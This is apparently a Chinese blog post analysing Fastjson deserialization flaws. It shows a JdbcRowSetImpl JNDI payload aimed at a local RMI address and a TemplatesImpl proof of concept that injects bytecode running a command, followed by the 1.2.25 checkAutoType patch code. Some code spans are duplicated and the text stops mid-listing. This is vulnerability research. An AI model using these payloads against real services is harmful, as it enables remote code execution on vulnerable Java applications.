<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>Fastjson浅析</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>Fastjson浅析</h2><h1 id="0x0-Fastjson"><a href="#0x0-Fastjson" class="headerlink" title="0x0 Fastjson"></a>0x0 Fastjson</h1><p>Java中会有将json数据与java bean序列化、反序列化绑定的需求，在Fastjson中提供两个主要接口toJsonString和parseObject来分别实现序列化和反序列化，使用Fastjson可以很方便的将json字符串反序列化成对象，并且基于@type的特性，能够实例化指定类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-comment">// 序列化</span><br>String jsonString = JSON.toJSONString(user);<br><span class="hljs-comment"><code class="language-hljs java"><span class="hljs-comment">// 序列化</span><br>String jsonString = JSON.toJSONString(user);<br><span class="hljs-comment">// 反序列化</span><br>User user = JSON.parseObject(jsonString, User.class);<br></code></pre></td></tr></table></figure>

<p>Fastjson架构图：</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/JdbcRowSetImpl_1.png" alt="JdbcRowSetImpl_1"></p>
<p>（图来自：<a target="_blank" rel="noopener" href="http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/">http://xxlegend.com/2017/12/06/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</a>)</p>
<blockquote>
<p>主要的功能都是在<code>DefaultJSONParser</code>类中实现的，在这个类中会应用其他的一些外部类来完成后续操作。<code>ParserConfig</code>主要是进行配置信息的初始化，<code>JSONLexer</code>主要是对json字符串进行处理并分析，反序列化在<code>JavaBeanDeserializer</code>中处理。</p>
</blockquote>
<p>json字符串的解析流程：</p>
<ol>
<li><p>DefaultJSONParser初始化，相关配置初始化</p>
</li>
<li><p>通过deserializer序列化对象，在parseObject中，如果指定了解析<code>class</code>则根据相应class获取<code>deserializer</code>，如果说不是<code>initDeserializer</code>中的类，则会调用<code>JavaBeanDeserializer#deserialze</code>转交<code>FastjsonASMDeserializer</code>利用Fastjson自己实现的ASM流程生成处理类.</p>
</li>
<li><p>解析json字符串的字段与值，通过标识位<code>lexer.token</code>的值，比如LBRACE（左括号）、LBRACKET （圆括号）等，进入4、5，并且设置下一个标识 <code>lexer.nextToken</code></p>
<blockquote>
<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre class=" language-hljs vala"><span class="hljs-meta"># 正常的kv结构</span><br>&#123;<span class="hljs-string">&quot;k&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>&#125;<br><br><span class="hljs-meta"># 嵌套结构</span><br>&#123;<span class="hljs-string">&quot;k&quot;</span>:&#123;<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>&#125;,<span class="hljs-string">&quot;k&quot;</span>:&#123;<span class="hljs-string">&quot;k&quot;</span>:<span class="hljs-string">&quot;kk&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string"><code class="language-hljs vala"><span class="hljs-meta"># 正常的kv结构</span><br>&#123;<span class="hljs-string">&quot;k&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>&#125;<br><br><span class="hljs-meta"># 嵌套结构</span><br>&#123;<span class="hljs-string">&quot;k&quot;</span>:&#123;<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>&#125;,<span class="hljs-string">&quot;k&quot;</span>:&#123;<span class="hljs-string">&quot;k&quot;</span>:<span class="hljs-string">&quot;kk&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">&quot;vv&quot;</span>,<span class="hljs-string">&quot;kk&quot;</span>:<span class="hljs-string">"vv"</span>&#125;&#125;,k:v&#125;<br></code></pre></td></tr></table></figure>

<p>最开始解析的标志位为<code>&#123;</code></p>
<ol>
<li>判断下一个标志位是否为<code>&quot;</code>，如果是<code>&quot;</code>则提取key值，这时的标志位为<code>&quot;</code>。</li>
<li>判断下一个标志位是否为<code>:</code>：<ul>
<li>如果为<code>:</code>则判断下一个标志位是否为<code>&quot;</code>，如果是，则获取value值，这时的标志位为<code>&quot;</code>。</li>
<li>如果为<code>&#123;</code>则重复1、2的过程。</li>
</ul>
</li>
<li>判断下一个标志位是否为<code>&#125;</code>：<ul>
<li>如果为<code>&#125;</code>则表示这一个单元的解析结束</li>
<li>如果为<code>,</code>则表示要解析下一个kv的数据，重复1、2、3</li>
</ul>
</li>
</ol>
</blockquote>
</li>
<li><p>判断解析的字符串中是否存在symbolTable中的字段，例如<code>@type</code>、<code>$ref</code> ，如果出现了<code>@type</code>则交由<code>public final Object parseObject(final Map object, Object fieldName)</code>来处理</p>
</li>
<li><p>如果解析出来的字符串为键、值则追加到map中，如果为双引号、括号等，重复3、4</p>
</li>
</ol>
<h1 id="0x1-Version-1-2-24"><a href="#0x1-Version-1-2-24" class="headerlink" title="0x1 Version 1.2.24"></a>0x1 Version 1.2.24</h1><p>环境：</p>
<ul>
<li>Fastjson版本 1.2.24</li>
<li>jdk参考JNDI，如果是RMI 需要低版本的JDK，这里用1.8.102</li>
</ul>
<p>poc1:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre class=" language-hljs java">String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br><span class="hljs-string"><code class="language-hljs java">String payload = <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/ExecTest\&quot;,&quot;</span> +<br><span class="hljs-string">" \"autoCommit\":true&#125;"</span>;<br></code></pre></td></tr></table></figure>



<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608103153064.png" alt="image-20220608103153064"></p>
<p>如果是@type 会特殊处理，实例化该类</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154409186.png" alt="image-20220608154409186"></p>
<p>config.getDeserilizer创建Deserilizer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154220293.png" alt="image-20220608154220293"></p>
<p>如果要反序列化的类不是内置的，则会创建JavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608154834849.png" alt="image-20220608154834849"></p>
<p>通过ASMFactory工厂创建JavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155009897.png" alt="image-20220608155009897"></p>
<p>asmFactory.createJavaBeanDeserializer</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155138953.png" alt="image-20220608155138953"></p>
<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#deserialze(com.alibaba.fastjson.parser.DefaultJSONParser, java.lang.reflect.Type, java.lang.Object)</code></p>
<p>使用ASM工厂构建出来的JavaBeanDeserializer.Deserializer进行反序列化</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155451795.png" alt="image-20220608155451795"></p>
<p>类实例化完之后会继续解析字段，并为这些字段赋值</p>
<p><code>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseRest</code></p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608155910782.png" alt="image-20220608155910782"></p>
<p>com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160151099.png" alt="image-20220608160151099"></p>
<p>com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer#parseField</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160234068.png" alt="image-20220608160234068"></p>
<p>com.alibaba.fastjson.parser.deserializer.FieldDeserializer#setValue(java.lang.Object, java.lang.Object)</p>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608160303364.png" alt="image-20220608160303364"></p>
<p>通过反射执行JdbcRowSetImpl.setAutoCommit，方法</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAutoCommit</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.conn != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">this</span>.conn.setAutoCommit(var1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">this</span>.conn = <span class="hljs-keyword">this</span>.connect();<br>        <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setAutoCommit</span><span class="hljs-params">(<span class="hljs-keyword">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.conn != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">this</span>.conn.setAutoCommit(var1);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">this</span>.conn = <span class="hljs-keyword">this</span>.connect();<br>        <span class="hljs-keyword">this</span>.conn.setAutoCommit(var1);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><code>this.connect</code>  调用<code>this.getDataSourceName()</code>，进行JNDI注入</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Connection <span class="hljs-title">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.conn != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.conn;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.getDataSourceName() != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            InitialContext var1 = <span class="hljs-keyword">new</span> InitialContext();<br>            DataSource var2 = (DataSource)var1.lookup(<span class="hljs-keyword">this</span>.getDataSourceName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getUsername() != <span class="hljs-keyword">null</span> &amp;&amp; !<span class="hljs-keyword">this</span>.getUsername().equals(<span class="hljs-string">&quot;&quot;</span>)?var2.getConnection(<span class="hljs-keyword">this</span>.getUsername(), <span class="hljs-keyword">this</span>.getPassword()):var2.getConnection();<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SQLException(<span class="hljs-keyword">this</span>.resBundle.handleGetObject(<span class="hljs-string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getUrl() != <span class="hljs-keyword">null</span>?DriverManager.getConnection(<span class="hljs-keyword">this</span>.getUrl(), <span class="hljs-keyword">this</span>.getUsername(), <span class="hljs-keyword">this</span>.getPassword()):<span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Connection <span class="hljs-title">connect</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.conn != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.conn;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.getDataSourceName() != <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            InitialContext var1 = <span class="hljs-keyword">new</span> InitialContext();<br>            DataSource var2 = (DataSource)var1.lookup(<span class="hljs-keyword">this</span>.getDataSourceName());<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getUsername() != <span class="hljs-keyword">null</span> &amp;&amp; !<span class="hljs-keyword">this</span>.getUsername().equals(<span class="hljs-string">&quot;&quot;</span>)?var2.getConnection(<span class="hljs-keyword">this</span>.getUsername(), <span class="hljs-keyword">this</span>.getPassword()):var2.getConnection();<br>        &#125; <span class="hljs-keyword">catch</span> (NamingException var3) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> SQLException(<span class="hljs-keyword">this</span>.resBundle.handleGetObject(<span class="hljs-string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.getUrl() != <span class="hljs-keyword">null</span>?DriverManager.getConnection(<span class="hljs-keyword">this</span>.getUrl(), <span class="hljs-keyword">this</span>.getUsername(), <span class="hljs-keyword">this</span>.getPassword()):<span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>这里RCE的有两个关键点：</p>
<ol>
<li><p>实例化类</p>
</li>
<li><p>反射执行方法</p>
</li>
</ol>
<p><img src="/2022/06/08/Fastjson%E5%88%86%E6%9E%90/image-20220608151545049.png" alt="image-20220608151545049"></p>
<p>Version 1.2.24 及之前还有一个POC</p>
<p>POC2:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V124_POC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String evilCode_base64 = readClass();<br>        <span class="hljs-keyword">final</span> String NASTY_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String payload = <span class="hljs-string">&quot;&#123;&#x27;rand1&#x27;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_name&#x27;:&#x27;aaa&#x27;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_outputProperties&#x27;:&#123;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&#125;\n&quot;</span>;<br>        JSON.parseObject(payload,User.class , Feature.SupportNonPublicField);<br>        System.out.println(payload);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AaAa</span> </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">readClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass cc = pool.get(AaAa.class.getName());<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;AaAa&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<br>        <span class="hljs-keyword">byte</span>[] evilCode = cc.toBytecode();<br><br>        <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">package</span> fastjson;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> org.apache.tomcat.util.codec.binary.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">V124_POC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String evilCode_base64 = readClass();<br>        <span class="hljs-keyword">final</span> String NASTY_CLASS = <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>        String payload = <span class="hljs-string">&quot;&#123;&#x27;rand1&#x27;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="hljs-string">&quot;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span> + evilCode_base64 + <span class="hljs-string">&quot;\&quot;],&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_name&#x27;:&#x27;aaa&#x27;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#x27;_outputProperties&#x27;:&#123;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&#125;\n&quot;</span>;<br>        JSON.parseObject(payload,User.class , Feature.SupportNonPublicField);<br>        System.out.println(payload);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AaAa</span> </span>&#123;<br><br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">readClass</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        CtClass cc = pool.get(AaAa.class.getName());<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>;<br>        cc.makeClassInitializer().insertBefore(cmd);<br>        String randomClassName = <span class="hljs-string">&quot;AaAa&quot;</span> + System.nanoTime();<br>        cc.setName(randomClassName);<br>        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));<br>        <span class="hljs-keyword">byte</span>[] evilCode = cc.toBytecode();<br><br>        <span class="hljs-keyword">return</span> Base64.encodeBase64String(evilCode);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<blockquote>
<p>TemplatesImpl类中<code>_bytecodes</code>、<code>_tfactory</code>、<code>_name</code>、<code>_outputProperties</code>、<code>_class</code>并没有对应的setter，所以要为这些private属性赋值，就需要开启SupportNonPublicField特性</p>
</blockquote>
<h1 id="0x2-Version-1-2-25-1-2-41"><a href="#0x2-Version-1-2-25-1-2-41" class="headerlink" title="0x2 Version 1.2.25 - 1.2.41"></a>0x2 Version 1.2.25 - 1.2.41</h1><p>1.2.25的修补方案是在创建@type指定的类之前，使用checkAutoType检查@type的类</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass) &#123;<br>        <span class="hljs-keyword">if</span> (typeName == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">final</span> String className = typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br><br>        <span class="hljs-comment">// 位置1，开启了autoTypeSupport，先白名单，如果在这个白名单里面的类直接加载返回</span><br>        <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>                String accept = acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                    <span class="hljs-keyword">return</span> TypeUtils.loadClass(typeName, defaultClassLoader);<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>                String deny = denyList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置2，从已存在的map中获取clazz，也就是缓存</span><br>        Class&lt;?&gt; clazz = TypeUtils.getClassFromMapping(typeName);<br>        <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span>) &#123;<br>            clazz = deserializers.findClass(typeName);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>            &#125;<br><br>            <span class="hljs-keyword">return</span> clazz;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置3，没开启autoTypeSupport，依然会进行黑白名单检测，先黑名单，再白名单</span><br>        <span class="hljs-keyword">if</span> (!autoTypeSupport) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; denyList.length; ++i) &#123;<br>                String deny = denyList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(deny)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; acceptList.length; ++i) &#123;<br>                String accept = acceptList[i];<br>                <span class="hljs-keyword">if</span> (className.startsWith(accept)) &#123;<br>                    clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br><br>                    <span class="hljs-keyword">if</span> (expectClass != <span class="hljs-keyword">null</span> &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;type not match. &quot;</span> + typeName + <span class="hljs-string">&quot; -&gt; &quot;</span> + expectClass.getName());<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> clazz;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 位置4，过了黑白名单，autoTypeSupport开启，就加载目标类</span><br>        <span class="hljs-keyword">if</span> (autoTypeSupport || expectClass != <span class="hljs-keyword">null</span>) &#123;<br>            clazz = TypeUtils.loadClass(typeName, defaultClassLoader);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (clazz != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-comment">// ClassLoader、DataSource子类/子接口检测</span><br>            <span class="hljs-keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz) <span class="hljs-comment">// classloader is danger</span><br>                    || DataSource.class.isAssignableFrom(clazz) <span class="hljs-comment">// dataSource can load jdbc driver</span><br>                    ) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> JSONException(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (expectClass 